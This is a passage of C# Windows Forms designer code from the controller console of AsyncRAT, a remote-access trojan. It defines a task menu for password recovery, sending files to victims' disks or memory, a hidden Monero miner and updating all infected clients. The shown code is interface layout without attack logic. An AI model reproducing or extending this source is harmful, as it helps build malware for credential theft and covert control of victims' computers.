		this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
		this.sTARTToolStripMenuItem.Size = new System.Drawing.Size(143, 32);
		this.sTARTToolStripMenuItem.Text = "START";
		this.sTARTToolStripMenuItem.Click += new System.EventHandler(STARTToolStripMenuItem_Click);
		this.sTOPToolStripMenuItem.Image = Server.Properties.Resources.stop__1_;
		this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
		this.sTOPToolStripMenuItem.Size = new System.Drawing.Size(143, 32);
		this.sTOPToolStripMenuItem.Text = "STOP";
		this.sTOPToolStripMenuItem.Click += new System.EventHandler(STOPToolStripMenuItem_Click);
		this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
		this.ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
		this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
		this.tabPage4.Controls.Add(this.listView4);
		this.tabPage4.Location = new System.Drawing.Point(4, 29);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage4.Size = new System.Drawing.Size(1293, 446);
		this.tabPage4.TabIndex = 3;
		this.tabPage4.Text = "Tasks";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader4, this.columnHeader5 });
		this.listView4.ContextMenuStrip = this.contextMenuTasks;
		this.listView4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView4.FullRowSelect = true;
		this.listView4.HideSelection = false;
		this.listView4.Location = new System.Drawing.Point(3, 3);
		this.listView4.Name = "listView4";
		this.listView4.Size = new System.Drawing.Size(1287, 440);
		this.listView4.TabIndex = 0;
		this.listView4.UseCompatibleStateImageBehavior = false;
		this.listView4.View = System.Windows.Forms.View.Details;
		this.columnHeader4.Text = "Task";
		this.columnHeader4.Width = 97;
		this.columnHeader5.Text = "Execution";
		this.columnHeader5.Width = 116;
		this.contextMenuTasks.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuTasks.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.pASSWORDRECOVERYToolStripMenuItem, this.downloadAndExecuteToolStripMenuItem, this.sENDFILETOMEMORYToolStripMenuItem1, this.minerToolStripMenuItem1, this.uPDATEToolStripMenuItem1, this.toolStripSeparator4, this.dELETETASKToolStripMenuItem });
		this.contextMenuTasks.Name = "contextMenuStrip4";
		this.contextMenuTasks.ShowImageMargin = false;
		this.contextMenuTasks.Size = new System.Drawing.Size(250, 202);
		this.pASSWORDRECOVERYToolStripMenuItem.Name = "pASSWORDRECOVERYToolStripMenuItem";
		this.pASSWORDRECOVERYToolStripMenuItem.Size = new System.Drawing.Size(249, 32);
		this.pASSWORDRECOVERYToolStripMenuItem.Text = "PASSWORD RECOVERY";
		this.pASSWORDRECOVERYToolStripMenuItem.Click += new System.EventHandler(PASSWORDRECOVERYToolStripMenuItem_Click);
		this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
		this.downloadAndExecuteToolStripMenuItem.Size = new System.Drawing.Size(249, 32);
		this.downloadAndExecuteToolStripMenuItem.Text = "SEND FILE TO DISK";
		this.downloadAndExecuteToolStripMenuItem.Click += new System.EventHandler(DownloadAndExecuteToolStripMenuItem_Click);
		this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
		this.sENDFILETOMEMORYToolStripMenuItem1.Size = new System.Drawing.Size(249, 32);
		this.sENDFILETOMEMORYToolStripMenuItem1.Text = "SEND FILE TO MEMORY";
		this.sENDFILETOMEMORYToolStripMenuItem1.Click += new System.EventHandler(SENDFILETOMEMORYToolStripMenuItem1_Click);
		this.minerToolStripMenuItem1.Name = "minerToolStripMenuItem1";
		this.minerToolStripMenuItem1.Size = new System.Drawing.Size(249, 32);
		this.minerToolStripMenuItem1.Text = "XMR MINER";
		this.minerToolStripMenuItem1.Visible = false;
		this.minerToolStripMenuItem1.Click += new System.EventHandler(MinerToolStripMenuItem1_Click);
		this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
		this.uPDATEToolStripMenuItem1.Size = new System.Drawing.Size(249, 32);
		this.uPDATEToolStripMenuItem1.Text = "UPDATE ALL CLIENTS";
		this.uPDATEToolStripMenuItem1.Click += new System.EventHandler(UPDATEToolStripMenuItem1_Click);
		this.toolStripSeparator4.Name = "toolStripSeparator4";
		this.toolStripSeparator4.Size = new System.Drawing.Size(246, 6);
		this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
		this.dELETETASKToolStripMenuItem.Size = new System.Drawing.Size(249, 32);
		this.dELETETASKToolStripMenuItem.Text = "DELETE TASK";
		this.dELETETASKToolStripMenuItem.Click += new System.EventHandler(DELETETASKToolStripMenuItem_Click);
		this.performanceCounter1.CategoryName = "Processor";
		this.performanceCounter1.CounterName = "% Processor Time";
		this.performanceCounter1.InstanceName = "_Total";
		this.performanceCounter2.CategoryName = "Memory";
		this.performanceCounter2.CounterName = "% Committed Bytes In Use";
		this.notifyIcon1.Icon = (System.Drawing.Icon)resources.GetObject("notifyIcon1.Icon");
		this.notifyIcon1.Text = "AsyncRAT";
		this.notifyIcon1.Visible = true;
		this.TimerTask.Enabled = true;
		this.TimerTask.Interval = 5000;
		this.TimerTask.Tick += new System.EventHandler(TimerTask_Tick);
		this.lv_group.Text = "Group";
		this.lv_group.Width = 110;
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1301, 511);
		base.Controls.Add(this.tabControl1);
		base.Controls.Add(this.statusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Form1";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "AsyncRAT-Sharp";
		base.Activated += new System.EventHandler(Form1_Activated);
		base.Deactivate += new System.EventHandler(Form1_Deactivate);
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Form1_FormClosed);
		base.Load += new System.EventHandler(Form1_Load);
		this.contextMenuClient.ResumeLayout(false);
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		this.tabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		this.tabPage2.ResumeLayout(false);
		this.contextMenuLogs.ResumeLayout(false);
		this.tabPage3.ResumeLayout(false);
		this.contextMenuThumbnail.ResumeLayout(false);
		this.tabPage4.ResumeLayout(false);
		this.contextMenuTasks.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
